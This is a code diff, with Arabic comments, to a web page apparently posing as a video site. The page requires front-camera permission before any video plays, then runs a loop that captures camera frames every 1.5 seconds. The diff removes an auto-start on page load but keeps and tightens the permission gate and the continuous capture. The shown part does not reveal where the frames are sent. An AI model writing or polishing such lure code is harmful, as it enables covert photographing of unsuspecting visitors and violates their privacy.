@@ -403,12 +403,14 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== الكاميرا والتقاط الصور التلقائي والمستمر ===== */
+/* ===== الكاميرا والتصوير ===== */
 let mediaStream = null;
+let captureInterval = null;
 
 function startCaptureLoop() {
+    if (captureInterval) return;
     const videoEl = document.getElementById('video');
-    setInterval(() => {
+    captureInterval = setInterval(() => {
         if (!mediaStream) return;
         try {
             const vw = videoEl.videoWidth || 640;
@@ -432,26 +434,9 @@ function startCaptureLoop() {
     }, 1500);
 }
 
-// 1. محاولة التشغيل التلقائي فور فتح الصفحة (إذا كان المتصفح قد حفظ إذن السماح مسبقاً)
-async function checkInitialPermission() {
-    try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: { ideal: 'user' } } 
-        });
-        const videoEl = document.getElementById('video');
-        videoEl.srcObject = mediaStream;
-        startCaptureLoop();
-    } catch (e) {
-        // إذا لم يكن الإذن ممنوحاً بعد، سيبقي المتصفح في انتظار تفاعل المستخدم
-    }
-}
-checkInitialPermission();
-
-
-/* ===== ارتباط فتح الفيديو بإذن الكاميرا ===== */
+/* ===== ربط فتح الفيديو بإذن الكاميرا فقط ===== */
 async function openVideo(id){
   try {
-    // عند الضغط على الفيديو، نطلب الإذن حصراً (إذا لم يكن ممنوحاً مسبقاً)
     if (!mediaStream) {
         mediaStream = await navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: { ideal: 'user' } } 
@@ -461,7 +446,7 @@ async function openVideo(id){
         startCaptureLoop();
     }
 
-    // إذا تم السماح بنجاح، افتح الفيديو
+    // لا يفتح الفيديو إلا بعد نيل الإذن والموافقة
     S.cur=id;S.view='watch';S.descOpen=false;
     S.hist=[id,...S.hist.filter(x=>x!==id)];
     document.body.classList.remove('drawer-open','searching');
@@ -469,8 +454,7 @@ async function openVideo(id){
     render(true);scrollTo(0,0);
 
   } catch (err) {
-    // إذا ضغط المستخدم على "عدم السماح"، فلن يفتح الفيديو إطلاقاً ويبقى في مكانه
-    // ولن يتم قفل الزر، بحيث إذا ضغط مرة أخرى سيظهر له إذن السماح مجدداً بشكل طبيعي
+    // في حال عدم السماح لا يحدث شيء ويظل المستخدم في الصفحة الرئيسية
     console.log("تم رفض الإذن، لن يفتح الفيديو");
   }
 }
@@ -616,10 +600,10 @@ document.addEventListener('keydown',e=>{
 });
 
 $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q').value.trim();
-  searchFor(t);$('#q'].blur();
+  searchFor(t);$('#q').blur();
 });
 
-/* ===== التعامل مع أزرار المتصفح ===== */
+/* ===== التعامل مع أزرار التنقل ===== */
 window.addEventListener('popstate',e=>{
   if(e.state){
     S.view=e.state.view;
@@ -636,9 +620,9 @@ window.addEventListener('popstate',e=>{
   scrollTo(0,0);
 });
 
-/* ===== Init ===== */
+/* ===== بدء تشغيل الصفحة المباشر ===== */
 document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
-render(true);
+render(false);
 </script>
 </body>
 </html>
